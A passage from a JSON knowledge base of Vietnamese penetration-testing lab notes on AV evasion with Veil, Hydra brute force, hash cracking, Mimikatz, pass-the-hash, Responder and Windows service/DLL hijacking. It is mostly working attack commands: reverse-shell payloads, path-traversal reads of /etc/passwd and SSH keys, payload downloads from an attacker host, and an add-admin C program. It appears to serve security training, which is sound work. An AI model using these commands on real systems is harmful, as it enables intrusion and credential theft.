      "anonymous_ftp",
      "msfconsole",
      "multi_handler",
      "meterpreter",
      "reverse_tcp"
    ],
    "code_snippets": [
      {
        "language": "bash",
        "command": "ftp -A <target_ip>"
      },
      {
        "language": "text",
        "command": "ftp> anonymous\nftp> bin\nftp> put putty.exe"
      },
      {
        "language": "bash",
        "command": "msfconsole -x \"use exploit/multi/handler;set payload windows/meterpreter/reverse_tcp;set LHOST <kali_ip>;set LPORT 4444;run;\""
      }
    ],
    "related_cves": [],
    "source_file": "10-AV Evasion.md"
  },
  {
    "id": "av_evasion_lab_capstone03_veil",
    "category": "AV Evasion",
    "title": "LAB Capstone 03: AV Evasion with Veil",
    "content": "Cài đặt Veil (`sudo apt -y install veil`, `/usr/share/veil/config/setup.sh`). Chạy `sudo veil`. Sử dụng Veil Evasion (use 1). Chọn payload (ví dụ: `powershell/reverse_tcp`), đặt LHOST/LPORT và tạo (`generate`) tệp payload (`powershell-payload.ps1`). Tải tệp payload lên máy chủ FTP (tương tự Lab 02). Mở `msfconsole` với `multi/handler` để nhận reverse shell.",
    "tags": [
      "lab",
      "capstone",
      "av_evasion",
      "tool",
      "veil",
      "install",
      "usage",
      "powershell",
      "reverse_tcp",
      "payload_generation",
      "ftp",
      "msfconsole",
      "multi_handler"
    ],
    "code_snippets": [
      {
        "language": "bash",
        "command": "sudo apt -y install veil"
      },
      {
        "language": "bash",
        "command": "/usr/share/veil/config/setup.sh --force --silent"
      },
      {
        "language": "bash",
        "command": "sudo veil"
      },
      {
        "language": "text",
        "command": "use 1\nlist\nuse powershell/reverse_tcp\nset LHOST <kali_ip>\nset LPORT 4444\ngenerate"
      }
    ],
    "related_cves": [],
    "source_file": "10-AV Evasion.md"
  },
  {
    "id": "network_attack_ssh_rdp_hydra",
    "category": "Password Attack",
    "title": "Attacking Network Services: SSH and RDP (Hydra)",
    "content": "Sử dụng Hydra để tấn công brute-force dịch vụ SSH (nếu có user) và RDP (nếu có mật khẩu - Password Spraying).",
    "tags": [
      "password_attack",
      "brute_force",
      "hydra",
      "ssh",
      "rdp",
      "password_spraying",
      "tool"
    ],
    "code_snippets": [
      {
        "language": "bash",
        "command": "hydra -l george -P /usr/share/wordlists/rockyou.txt -s 2222 ssh://<target_ip>"
      },
      {
        "language": "bash",
        "command": "hydra -L /usr/share/wordlists/dirb/others/names.txt -p \"SuperS3cure1337#\" rdp://<target_ip>"
      }
    ],
    "related_cves": [],
    "source_file": "11-Password Attack.md"
  },
  {
    "id": "network_attack_lab_ssh",
    "category": "Password Attack",
    "title": "LAB: Hydra SSH Brute Force",
    "content": "Sử dụng Hydra để brute-force mật khẩu SSH cho user 'george'.",
    "tags": [
      "lab",
      "password_attack",
      "brute_force",
      "hydra",
      "ssh",
      "linux"
    ],
    "code_snippets": [
      {
        "language": "bash",
        "command": "hydra -l \"george\" -P rockyou.txt -s 2222 ssh://<target_ip>"
      }
    ],
    "related_cves": [],
    "source_file": "11-Password Attack.md"
  },
  {
    "id": "network_attack_lab_rdp_spray",
    "category": "Password Attack",
    "title": "LAB: Hydra RDP Password Spraying",
    "content": "Sử dụng Hydra và một danh sách tên người dùng (names.txt) để thực hiện tấn công Password Spraying vào dịch vụ RDP với một mật khẩu đã biết.",
    "tags": [
      "lab",
      "password_attack",
      "password_spraying",
      "hydra",
      "rdp",
      "windows"
    ],
    "code_snippets": [
      {
        "language": "bash",
        "command": "hydra -L names.txt -p \"SuperS3cure1337#\" -s 3389 rdp://<target_ip>"
      }
    ],
    "related_cves": [],
    "source_file": "11-Password Attack.md"
  },
  {
    "id": "network_attack_lab_ftp",
    "category": "Password Attack",
    "title": "LAB: Hydra FTP Brute Force",
    "content": "Sử dụng Nmap để quét cổng, phát hiện cổng 21 (FTP). Sử dụng Hydra để brute-force mật khẩu FTP cho user 'itadmin'.",
    "tags": [
      "lab",
      "password_attack",
      "brute_force",
      "hydra",
      "ftp",
      "nmap",
      "port_21"
    ],
    "code_snippets": [
      {
        "language": "bash",
        "command": "hydra -l \"itadmin\" -P /usr/share/wordlists/rockyou.txt ftp://<target_ip>"
      }
    ],
    "related_cves": [],
    "source_file": "11-Password Attack.md"
  },
  {
    "id": "network_attack_http_post",
    "category": "Password Attack",
    "title": "Attacking Network Services: HTTP POST Login Form",
    "content": "Sử dụng Hydra với mô-đun `http-post-form` để brute-force form đăng nhập web. Cần chỉ định URL, tên tham số (ví dụ: fm_usr, fm_passwd), và thông báo lỗi khi đăng nhập thất bại. Cũng có thể dùng Burp Suite Intruder.",
    "tags": [
      "password_attack",
      "brute_force",
      "hydra",
      "http_post_form",
      "web",
      "burpsuite",
      "intruder"
    ],
    "code_snippets": [
      {
        "language": "bash",
        "command": "hydra -l user -P /usr/share/wordlists/rockyou.txt <target_ip> -s 80 http-post-form \"/index.php:fm_usr=^USER^&fm_passwd=^PASS^:Login failed. Invalid\""
      }
    ],
    "related_cves": [],
    "source_file": "11-Password Attack.md"
  },
  {
    "id": "network_attack_lab_http_post",
    "category": "Password Attack",
    "title": "LAB: Hydra HTTP POST Brute Force",
    "content": "Sử dụng Hydra `http-post-form` để brute-force mật khẩu cho 'user' trên form đăng nhập web.",
    "tags": [
      "lab",
      "password_attack",
      "brute_force",
      "hydra",
      "http_post_form",
      "web"
    ],
    "code_snippets": [
      {
        "language": "bash",
        "command": "hydra -l user -P /usr/share/wordlists/rockyou.txt <target_ip> http-post-form \"/index.php:username=user&password=^PASS^:Login failed. Invalid\""
      }
    ],
    "related_cves": [],
    "source_file": "11-Password Attack.md"
  },
  {
    "id": "password_cracking_theory",
    "category": "Password Attack",
    "title": "Password Cracking: Introduction",
    "content": "Lý thuyết về bẻ khóa mật khẩu, bao gồm mã hóa đối xứng/bất đối xứng, các thuật toán băm (MD5, SHA-1), và các công cụ (John the Ripper, Hashcat). So sánh tốc độ GPU (hashcat) > CPU (john, hashcat).",
    "tags": [
      "theory",
      "password_cracking",
      "hashing",
      "md5",
      "sha1",
      "john",
      "hashcat"
    ],
    "code_snippets": [],
    "related_cves": [],
    "source_file": "11-Password Attack.md"
  },
  {
    "id": "password_cracking_mutating_wordlists",
    "category": "Password Attack",
    "title": "Password Cracking: Mutating Wordlists (Hashcat Rules)",
    "content": "Do các chính sách mật khẩu (độ dài, ký tự đặc biệt), cần phải biến đổi wordlist. Sử dụng Hashcat với các quy tắc (rules) để tạo ra các biến thể mật khẩu. Ví dụ, tạo tệp .rule và dùng cờ `-r`.",
    "tags": [
      "theory",
      "password_cracking",
      "hashcat",
      "wordlist_mutation",
      "rules",
      "password_policy"
    ],
    "code_snippets": [
      {
        "language": "text",
        "command": "$1 c %!"
      },
      {
        "language": "bash",
        "command": "hashcat -m 0 crackme.txt /usr/share/wordlists/rockyou.txt -r demo.rule --force"
      }
    ],
    "related_cves": [],
    "source_file": "11-Password Attack.md"
  },
  {
    "id": "password_cracking_lab_hashcat_rules",
    "category": "Password Attack",
    "title": "LAB: Hashcat Rules",
    "content": "Hai bài lab thực hành tạo tệp quy tắc (ví dụ: `$1 $@ $3 $$ $5` và `u d`) và sử dụng `hashcat` để bẻ khóa hash MD5 (mode 0) với các quy tắc đó.",
    "tags": [
      "lab",
      "password_cracking",
      "hashcat",
      "rules",
      "md5"
    ],
    "code_snippets": [
      {
        "language": "bash",
        "command": "hashcat -m 0 crack1.txt /usr/share/wordlists/rockyou.txt -r lab1.rule --force"
      },
      {
        "language": "bash",
        "command": "hashcat -m 0 crack2.txt /usr/share/wordlists/rockyou.txt -r lab2.rule --force"
      }
    ],
    "related_cves": [],
    "source_file": "11-Password Attack.md"
  },
  {
    "id": "password_cracking_methodology",
    "category": "Password Attack",
    "title": "Password Cracking: Methodologies",
    "content": "Quy trình bẻ khóa hash: 1. Trích xuất hashes. 2. Định dạng/Xác định loại hash (dùng `hashid`, `hash-identifier`). 3. Ước tính thời gian bẻ khóa. 4. Chuẩn bị wordlist. 5. Tấn công hash.",
    "tags": [
      "theory",
      "password_cracking",
      "methodology",
      "hashid",
      "hash_identifier"
    ],
    "code_snippets": [],
    "related_cves": [],
    "source_file": "11-Password Attack.md"
  },
  {
    "id": "password_cracking_keepass",
    "category": "Password Attack",
    "title": "Password Cracking: KeePass (.kdbx)",
    "content": "KeePass là trình quản lý mật khẩu. Tìm tệp `.kdbx` trên hệ thống (dùng `Get-ChildItem`). Sử dụng `keepass2john` để trích xuất hash từ tệp .kdbx. Sử dụng `hashcat` mode 13400 để bẻ khóa hash.",
    "tags": [
      "password_cracking",
      "keepass",
      "kdbx",
      "keepass2john",
      "hashcat",
      "john",
      "mode_13400"
    ],
    "code_snippets": [
      {
        "language": "powershell",
        "command": "Get-ChildItem -Path C:\\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue"
      },
      {
        "language": "bash",
        "command": "keepass2john Database.kdbx > keepass.hash"
      },
      {
        "language": "bash",
        "command": "hashcat -m 13400 keepass.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/rockyou-3000.rule --force"
      }
    ],
    "related_cves": [],
    "source_file": "11-Password Attack.md"
  },
  {
    "id": "password_cracking_ssh_key_passphrase",
    "category": "Password Attack",
    "title": "Password Cracking: SSH Private Key Passphrase",
    "content": "Nếu một private key (ví dụ: `id_rsa`) được bảo vệ bằng cụm mật khẩu, sử dụng `ssh2john` để chuyển nó thành hash. Sử dụng `hashcat` (ví dụ: mode 22921) hoặc `john` (với rules tùy chỉnh) để bẻ khóa cụm mật khẩu.",
    "tags": [
      "password_cracking",
      "ssh",
      "id_rsa",
      "passphrase",
      "ssh2john",
      "hashcat",
      "john",
      "rules"
    ],
    "code_snippets": [
      {
        "language": "bash",
        "command": "ssh2john id_rsa > ssh.hash"
      },
      {
        "language": "bash",
        "command": "hashcat -m 22921 ssh.hash ssh.passwords -r ssh.rule --force"
      },
      {
        "language": "bash",
        "command": "john --wordlist=ssh.passwords --rules=sshRules ssh.hash"
      }
    ],
    "related_cves": [],
    "source_file": "11-Password Attack.md"
  },
  {
    "id": "password_cracking_lab_ssh_key_cve",
    "category": "Password Attack",
    "title": "LAB: SSH Key Passphrase Crack (via CVE-2021-4177)",
    "content": "Quét Nmap thấy cổng 80 (Apache 2.4.49). Khai thác lỗ hổng Path Traversal (CVE-2021-4177) bằng `curl` để đọc `/etc/passwd` (tìm user `alfred`) và `/home/alfred/.ssh/id_rsa`. Sử dụng `ssh2john` và `john` (với rules) để bẻ khóa cụm mật khẩu của key. Dùng key và cụm mật khẩu đã bẻ khóa để SSH vào máy chủ.",
    "tags": [
      "lab",
      "password_cracking",
      "ssh",
      "id_rsa",
      "passphrase",
      "ssh2john",
      "john",
      "cve",
      "path_traversal",
      "apache",
      "curl"
    ],
    "code_snippets": [
      {
        "language": "bash",
        "command": "curl -s --path-as-is \"http://<target_ip>/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd\""
      },
      {
        "language": "bash",
        "command": "curl -s --path-as-is \"http://<target_ip>/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/home/alfred/.ssh/id_rsa\""
      },
      {
        "language": "bash",
        "command": "ssh2john lab2_id_rsa_alfred > lab2_id_rsa_alfred.hash"
      },
      {
        "language": "bash",
        "command": "john --wordlist=/usr/share/wordlists/rockyou.txt --rules=sshRules lab2_id_rsa_alfred.hash"
      },
      {
        "language": "bash",
        "command": "ssh -i lab2_id_rsa_alfred -p 2222 alfred@<target_ip>"
      }
    ],
    "related_cves": [
      "CVE-2021-4177"
    ],
    "source_file": "11-Password Attack.md"
  },
  {
    "id": "password_cracking_ntlm_mimikatz",
    "category": "Password Attack",
    "title": "Cracking NTLM (Mimikatz)",
    "content": "Windows lưu hash NTLM trong file SAM, được quản lý bởi tiến trình LSASS. Sử dụng `Mimikatz` với quyền Administrator để trích xuất hash. Cần `privilege::debug` và `token::elevate` (để có quyền SYSTEM), sau đó chạy `sekurlsa::logonpasswords` hoặc `lsadump::sam`. Sử dụng `hashcat` mode 1000 để bẻ khóa hash NTLM.",
    "tags": [
      "password_cracking",
      "ntlm",
      "windows",
      "mimikatz",
      "lsass",
      "sam",
      "privilege_debug",
      "token_elevate",
      "sekurlsa_logonpasswords",
      "lsadump_sam",
      "hashcat",
      "mode_1000"
    ],
    "code_snippets": [
      {
        "language": "powershell",
        "command": "privilege::debug"
      },
      {
        "language": "powershell",
        "command": "token::elevate"
      },
      {
        "language": "powershell",
        "command": "lsadump::sam"
      },
      {
        "language": "bash",
        "command": "hashcat -m 1000 NTLM.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force"
      }
    ],
    "related_cves": [],
    "source_file": "11-Password Attack.md"
  },
  {
    "id": "password_cracking_pass_the_hash",
    "category": "Password Attack",
    "title": "Passing NTLM (Pass the Hash)",
    "content": "Pass the Hash (PtH) là kỹ thuật xác thực mà không cần mật khẩu, chỉ cần hash NTLM. Các công cụ hỗ trợ PtH bao gồm `Mimikatz`, `smbclient`, `crackmapexec`, `impacket-psexec` (mở shell system), và `impacket-wmiexec` (mở shell user).",
    "tags": [
      "password_attack",
      "pass_the_hash",
      "pth",
      "ntlm",
      "windows",
      "mimikatz",
      "smbclient",
      "crackmapexec",
      "impacket-psexec",
      "impacket-wmiexec"
    ],
    "code_snippets": [
      {
        "language": "bash",
        "command": "impacket-psexec -hashes 00000000000000000000000000000000:7a38310ea6f0027ee955abed1762964b Administrator@<target_ip>"
      },
      {
        "language": "bash",
        "command": "impacket-wmiexec -hashes 00000000000000000000000000000000:7a38310ea6f0027ee955abed1762964b Administrator@<target_ip>"
      }
    ],
    "related_cves": [],
    "source_file": "11-Password Attack.md"
  },
  {
    "id": "password_cracking_net_ntlmv2",
    "category": "Password Attack",
    "title": "Cracking Net-NTLMv2",
    "content": "Net-NTLMv2 là hash dùng để xác thực qua mạng. Sử dụng các công cụ như `Responder` hoặc `impacket-smbserver` để tạo máy chủ SMB giả mạo và bắt hash khi máy Windows mục tiêu cố gắng xác thực. Sử dụng `hashcat` mode 5600 để bẻ khóa hash Net-NTLMv2.",
    "tags": [
      "password_cracking",
      "net_ntlmv2",
      "windows",
      "responder",
      "impacket-smbserver",
      "hashcat",
      "mode_5600"
    ],
    "code_snippets": [
      {
        "language": "bash",
        "command": "responder -I eth0"
      },
      {
        "language": "bash",
        "command": "impacket-smbserver share /tmp/share -smb2support"
      },
      {
        "language": "bash",
        "command": "hashcat -m 5600 Net-NTLMv2.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force"
      }
    ],
    "related_cves": [],
    "source_file": "11-Password Attack.md"
  },
  {
    "id": "password_cracking_lab_net_ntlmv2",
    "category": "Password Attack",
    "title": "LAB: Cracking Net-NTLMv2 (Responder)",
    "content": "Từ một shell có sẵn, chạy `Responder` trên Kali. Từ máy Windows mục tiêu, thực hiện một hành động kích hoạt xác thực SMB (ví dụ: `dir \\\\attacker-ip\\share`). `Responder` sẽ bắt được hash Net-NTLMv2. Bẻ khóa hash bằng `hashcat`.",
    "tags": [
      "lab",
      "password_cracking",
      "net_ntlmv2",
      "responder",
      "hashcat"
    ],
    "code_snippets": [
      {
        "language": "bash",
        "command": "sudo responder -I eth0"
      },
      {
        "language": "powershell",
        "command": "dir \\\\<kali_ip>\\share"
      }
    ],
    "related_cves": [],
    "source_file": "11-Password Attack.md"
  },
  {
    "id": "winprivesc_theory_access_control",
    "category": "Windows Privilege",
    "title": "Understanding Windows Privileges and Access Control",
    "content": "Lý thuyết về các cơ chế kiểm soát truy cập của Windows, bao gồm: Security Identifier (SID), Access token (Primary và Impersonation), Mandatory Integrity Control (MIC - 5 cấp độ: System, High, Medium, Low, Untrusted), và User Account Control (UAC).",
    "tags": [
      "theory",
      "windows",
      "privesc",
      "access_control",
      "sid",
      "access_token",
      "mic",
      "uac"
    ],
    "code_snippets": [],
    "related_cves": [],
    "source_file": "12-Windows Privilege.md"
  },
  {
    "id": "winprivesc_enum_situational_awareness",
    "category": "Windows Privilege",
    "title": "Enumerating Windows: Situational Awareness",
    "content": "Các lệnh cơ bản để thu thập thông tin hệ thống Windows: `whoami`, `whoami /groups`, `net user`, `Get-LocalUser`, `net localgroup`, `Get-LocalGroupMember`, `systeminfo`, `ipconfig /all`, `netstat -ano`, `Get-ItemProperty` (để liệt kê ứng dụng đã cài từ Registry), `Get-Process`.",
    "tags": [
      "windows",
      "privesc",
      "enumeration",
      "manual_enum",
      "whoami",
      "net_user",
      "systeminfo",
      "netstat",
      "get-process",
      "get-itemproperty",
      "powershell"
    ],
    "code_snippets": [
      {
        "language": "powershell",
        "command": "whoami /groups"
      },
      {
        "language": "powershell",
        "command": "Get-LocalUser"
      },
      {
        "language": "powershell",
        "command": "systeminfo"
      },
      {
        "language": "powershell",
        "command": "Get-ItemProperty \"HKLM:\\SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\*\" | select displayname"
      }
    ],
    "related_cves": [],
    "source_file": "12-Windows Privilege.md"
  },
  {
    "id": "winprivesc_enum_hidden_files",
    "category": "Windows Privilege",
    "title": "Enumerating Windows: Hidden in Plain View (Sensitive Files)",
    "content": "Sử dụng PowerShell `Get-ChildItem` để đệ quy tìm kiếm các tệp tin nhạy cảm (.txt, .ini, .kdbx, .pdf, .doc) có thể chứa thông tin đăng nhập hoặc cấu hình.",
    "tags": [
      "windows",
      "privesc",
      "enumeration",
      "manual_enum",
      "sensitive_files",
      "get-childitem",
      "powershell",
      "credential_hunting"
    ],
    "code_snippets": [
      {
        "language": "powershell",
        "command": "Get-ChildItem -Path C:\\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue"
      },
      {
        "language": "powershell",
        "command": "Get-ChildItem -Path C:\\ -Include *.txt, *.ini -File -Recurse -ErrorAction SilentlyContinue"
      }
    ],
    "related_cves": [],
    "source_file": "12-Windows Privilege.md"
  },
  {
    "id": "winprivesc_lab_find_creds_runas",
    "category": "Windows Privilege",
    "title": "LAB: Find Credentials and Use 'runas'",
    "content": "Từ shell 'dave', dùng `Get-ChildItem` tìm thấy `asdf.txt` chứa creds của 'steve' (RDP user). RDP vào 'steve', dùng `Get-ChildItem` lần nữa, tìm thấy `mysql.ini` chứa creds của 'backupadmin' (Admin). Sử dụng `runas /user:backupadmin cmd` để mở shell với quyền admin.",
    "tags": [
      "lab",
      "windows",
      "privesc",
      "credential_hunting",
      "get-childitem",
      "rdp",
      "runas"
    ],
    "code_snippets": [
      {
        "language": "powershell",
        "command": "runas /user:backupadmin cmd"
      }
    ],
    "related_cves": [],
    "source_file": "12-Windows Privilege.md"
  },
  {
    "id": "winprivesc_lab_find_creds_base64",
    "category": "Windows Privilege",
    "title": "LAB: Find Credentials (Base64)",
    "content": "Từ shell 'mac', dùng `Get-ChildItem` tìm thấy `install.ini`. Nội dung file được mã hóa base64. Giải mã để lấy creds của 'richmond' (RDP user).",
    "tags": [
      "lab",
      "windows",
      "privesc",
      "credential_hunting",
      "get-childitem",
      "base64",
      "rdp"
    ],
    "code_snippets": [],
    "related_cves": [],
    "source_file": "12-Windows Privilege.md"
  },
  {
    "id": "winprivesc_enum_powershell_history",
    "category": "Windows Privilege",
    "title": "Enumerating Windows: PowerShell Goldmine",
    "content": "Kiểm tra lịch sử PowerShell và các bản ghi (transcripts). PowerShell Transcription lưu lại phiên làm việc, thường ở thư mục người dùng. PowerShell Script Block Logging (Event ID 4104) ghi lại toàn bộ nội dung lệnh, kể cả mã đã mã hóa. Dùng `(Get-PSReadlineOption).HistorySavePath` để tìm tệp lịch sử.",
    "tags": [
      "windows",
      "privesc",
      "enumeration",
      "powershell",
      "powershell_transcription",
      "script_block_logging",
      "event_id_4104",
      "get-psreadlineoption"
    ],
    "code_snippets": [
      {
        "language": "powershell",
        "command": "(Get-PSReadlineOption).HistorySavePath"
      },
      {
        "language": "powershell",
        "command": "Get-History"
      }
    ],
    "related_cves": [],
    "source_file": "12-Windows Privilege.md"
  },
  {
    "id": "winprivesc_lab_powershell_transcript",
    "category": "Windows Privilege",
    "title": "LAB: PowerShell Transcription",
    "content": "Từ shell 'dave', tìm tệp lịch sử PowerShell. Đọc tệp lịch sử thấy tham chiếu đến `transcript01.txt`. Đọc tệp transcript tìm thấy creds của 'daveadmin' (Remote Management User). Dùng `evil-winrm` để đăng nhập.",
    "tags": [
      "lab",
      "windows",
      "privesc",
      "powershell_transcription",
      "credential_hunting",
      "evil-winrm"
    ],
    "code_snippets": [
      {
        "language": "bash",
        "command": "evil-winrm -i <target_ip> -u \"daveadmin\" -p \"qwertqwertqwert123\!\!\""
      }
    ],
    "related_cves": [],
    "source_file": "12-Windows Privilege.md"
  },
  {
    "id": "winprivesc_lab_powershell_event_log",
    "category": "Windows Privilege",
    "title": "LAB: PowerShell Event Viewer (ID 4104)",
    "content": "RDP vào máy. Mở Event Viewer, đi đến log PowerShell (Application and Services Logs -> ... -> PowerShell -> Operational). Lọc theo Event ID 4104 (Script Block Logging) hoặc tìm kiếm từ khóa 'pass', 'cred' để tìm mật khẩu.",
    "tags": [
      "lab",
      "windows",
      "privesc",
      "powershell",
      "script_block_logging",
      "event_id_4104",
      "event_viewer",
      "credential_hunting"
    ],
    "code_snippets": [],
    "related_cves": [],
    "source_file": "12-Windows Privilege.md"
  },
  {
    "id": "winprivesc_enum_automated",
    "category": "Windows Privilege",
    "title": "Enumerating Windows: Automated Enumeration",
    "content": "Sử dụng các công cụ tự động như `WinPEAS`, `Seatbelt`, `JAWS` để quét các vectơ leo thang đặc quyền.",
    "tags": [
      "windows",
      "privesc",
      "enumeration",
      "automated_enum",
      "winpeas",
      "seatbelt",
      "jaws",
      "tool"
    ],
    "code_snippets": [
      {
        "language": "powershell",
        "command": "iwr -uri http://<kali_ip>:8000/winPEASx64.exe -Outfile winPEASx64.exe"
      },
      {
        "language": "powershell",
        "command": ".\\winPEASx64.exe > Result-winPEAS.txt"
      }
    ],
    "related_cves": [],
    "source_file": "12-Windows Privilege.md"
  },
  {
    "id": "winprivesc_service_binary_hijacking",
    "category": "Windows Privilege",
    "title": "Leveraging Windows Services: Service Binary Hijacking",
    "content": "Khai thác khi tệp thực thi (binary) của một dịch vụ (service) có quyền ghi không an toàn (ví dụ: Users group có quyền Write). Kẻ tấn công có thể thay thế tệp binary bằng một payload độc hại. Khi dịch vụ được khởi động lại (thủ công hoặc reboot máy), payload sẽ thực thi với quyền của dịch vụ (thường là LocalSystem). Sử dụng `Get-CimInstance win32_service` để liệt kê dịch vụ, `icacls` để kiểm tra quyền tệp.",
    "tags": [
      "windows",
      "privesc",
      "service_exploitation",
      "binary_hijacking",
      "insecure_permissions",
      "icacls",
      "get-ciminstance",
      "localsystem"
    ],
    "code_snippets": [
      {
        "language": "powershell",
        "command": "Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}"
      },
      {
        "language": "powershell",
        "command": "icacls \"C:\\xampp\\mysql\\bin\\mysqld.exe\""
      }
    ],
    "related_cves": [],
    "source_file": "12-Windows Privilege.md"
  },
  {
    "id": "winprivesc_lab_service_binary_hijack_manual",
    "category": "Windows Privilege",
    "title": "LAB: Service Binary Hijacking (Manual)",
    "content": "RDP vào máy, kiểm tra quyền của `mysqld.exe` và thấy có thể ghi. Dùng `mingw-w64` (`x86_64-w64-mingw32-gcc`) để biên dịch chéo một payload C (`adduser.exe`) trên Kali. Tải payload lên, thay thế `mysqld.exe`. Khởi động lại máy (`shutdown /r /t 0`). RDP lại và dùng `runas` với user mới (dave2) đã được thêm vào nhóm Administrators.",
    "tags": [
      "lab",
      "windows",
      "privesc",
      "service_exploitation",
      "binary_hijacking",
      "mingw-w64",
      "cross_compile",
      "shutdown",
      "runas"
    ],
    "code_snippets": [
      {
        "language": "c",
        "command": "#include <stdlib.h>\nint main ()\n{\nint i;\ni = system (\"net user dave2 password123! /add\");\ni = system (\"net localgroup administrators dave2 /add\");\nreturn 0;\n}"
      },
      {
        "language": "bash",
        "command": "x86_64-w64-mingw32-gcc adduser.c -o adduser.exe"
      }
    ],
    "related_cves": [],
    "source_file": "12-Windows Privilege.md"
  },
  {
    "id": "winprivesc_lab_service_binary_hijack_powerup",
    "category": "Windows Privilege",
    "title": "LAB: Service Binary Hijacking (PowerUp)",
    "content": "RDP vào máy, tải lên và chạy `PowerUp.ps1`. Sử dụng `Get-ModifiableServiceFile` để tìm dịch vụ có tệp binary có thể bị ghi đè (`BackupMonitor.exe`). Dùng `msfvenom` tạo payload reverse shell (`malicious.exe`). Tải lên, thay thế tệp gốc. Dừng (`net stop`) và khởi động lại (`net start`) dịch vụ để nhận shell.",
    "tags": [
      "lab",
      "windows",
      "privesc",
      "service_exploitation",
      "binary_hijacking",
      "powerup",
      "get-modifiableservicefile",
      "msfvenom",
      "net_start"
    ],
    "code_snippets": [
      {
        "language": "powershell",
        "command": "powershell -ep bypass"
      },
      {
        "language": "powershell",
        "command": ".\\PowerUp.ps1"
      },
      {
        "language": "powershell",
        "command": "Get-ModifiableServiceFile"
      },
      {
        "language": "bash",
        "command": "msfvenom -p windows/x64/shell_reverse_tcp LHOST=<kali_ip> LPORT=443 -f exe -o malicious.exe"
      },
      {
        "language": "powershell",
        "command": "net stop BackupMonitor"
      },
      {
        "language": "powershell",
        "command": "net start BackupMonitor"
      }
    ],
    "related_cves": [],
    "source_file": "12-Windows Privilege.md"
  },
  {
    "id": "winprivesc_dll_hijacking",
    "category": "Windows Privilege",
    "title": "Leveraging Windows Services: DLL Hijacking",
    "content": "Khai thác thứ tự tìm kiếm DLL chuẩn của Windows. Nếu một ứng dụng tải DLL từ một thư mục mà người dùng có quyền ghi, kẻ tấn công có thể đặt một DLL độc hại có cùng tên vào thư mục đó. DLL độc hại sẽ được tải thay vì DLL hợp pháp.",
    "tags": [
      "theory",
      "windows",
      "privesc",
      "service_exploitation",
      "dll_hijacking",
      "insecure_permissions",
      "dll_search_order"
    ],
    "code_snippets": [],
    "related_cves": [],
    "source_file": "12-Windows Privilege.md"
  },
  {
    "id": "winprivesc_lab_dll_hijacking",
    "category": "Windows Privilege",
    "title": "LAB: DLL Hijacking (FileZilla)",
    "content": "RDP vào máy, phát hiện FileZilla đã cài. Kiểm tra quyền ghi vào thư mục cài đặt của FileZilla (`C:\\FileZilla\\FileZilla FTP Client\\`) và thấy có thể ghi. Sử dụng ProcessMonitor (ProcMon) để xác định DLL bị thiếu hoặc được tải không an toàn (ví dụ: `TextShaping.dll`). Dùng `msfvenom` tạo payload DLL độc hại. Tải lên và ghi đè tệp DLL. Khi FileZilla được khởi chạy, payload sẽ thực thi.",
    "tags": [
      "lab",
      "windows",
      "privesc",
      "dll_hijacking",
      "filezilla",
      "process_monitor",
      "procmon",
      "msfvenom",
      "insecure_permissions"
    ],
    "code_snippets": [
      {
        "language": "powershell",
        "command": "echo \"test\" > 'C:\\FileZilla\\FileZilla FTP Client\\test.txt'"
      },
      {
        "language": "bash",
        "command": "msfvenom -p windows/x64/shell_reverse_tcp LHOST=<kali_ip> LPORT=4444 -f dll -o TextShaping.dll"
      },
      {
        "language": "powershell",
        "command": "iwr -uri http://<kali_ip>:8000/TextShaping.dll -Outfile 'C:\\FileZilla\\FileZilla FTP Client\\TextShaping.dll'"
      }
    ],
    "related_cves": [],
    "source_file": "12-Windows Privilege.md"
  },
  {
    "id": "winprivesc_unquoted_service_paths",
    "category": "Windows Privilege",
    "title": "Leveraging Windows Services: Unquoted Service Paths",
    "content": "Lỗ hổng xảy ra khi đường dẫn đến tệp thực thi của dịch vụ chứa dấu cách và không được đặt trong dấu ngoặc kép. Windows sẽ cố gắng thực thi từng phần của đường dẫn. Ví dụ: `C:\\Program Files\\My Program\\service.exe` sẽ khiến Windows thử chạy `C:\\Program.exe`, rồi `C:\\Program Files\\My.exe`, v.v. Nếu kẻ tấn công có thể ghi vào một trong các thư mục này, họ có thể đặt payload (ví dụ: `My.exe`). Dùng `wmic` hoặc `Get-UnquotedServicePath` của PowerUp để tìm.",
    "tags": [
      "theory",
      "windows",
      "privesc",
      "service_exploitation",
      "unquoted_service_path",
      "wmic",
      "powerup"
    ],
    "code_snippets": [
      {
        "language": "powershell",
        "command": "wmic service get name,pathname |  findstr /i /v \"C:\\Windows\\\\\" | findstr /i /v \"\"\""
      }
    ],
    "related_cves": [],
    "source_file": "12-Windows Privilege.md"
  },
  {
    "id": "winprivesc_lab_unquoted_service_path",
    "category": "Windows Privilege",
    "title": "LAB: Unquoted Service Paths (Manual/PowerUp)",
    "content": "Sử dụng `wmic` (LAB 1) hoặc `Get-UnquotedServicePath` của PowerUp (LAB 2) để tìm dịch vụ có đường dẫn không được trích dẫn. Dùng `icacls` để kiểm tra quyền ghi trên các thư mục cha. Tạo payload (`msfvenom`) có tên phù hợp (ví dụ: `Current.exe` hoặc `Surveillance.exe`), tải lên thư mục có thể ghi. Khởi động dịch vụ (`Start-Service`) để kích hoạt reverse shell.",
    "tags": [
      "lab",
      "windows",
      "privesc",
      "unquoted_service_path",
      "wmic",
      "powerup",
      "icacls",
      "msfvenom",
      "start-service"
    ],
    "code_snippets": [
      {
        "language": "powershell",
        "command": "iwr -uri http://<kali_ip>:8000/Current.exe -Outfile 'C:\\Program Files\\Enterprise Apps\\Current.exe'"
      },
      {
        "language": "powershell",
        "command": "Start-Service GammaService"
      }
    ],
    "related_cves": [],
    "source_file": "12-Windows Privilege.md"
  },
  {
    "id": "winprivesc_scheduled_tasks",
    "category": "Windows Privilege",
    "title": "Abusing Other Windows Components: Scheduled Tasks",
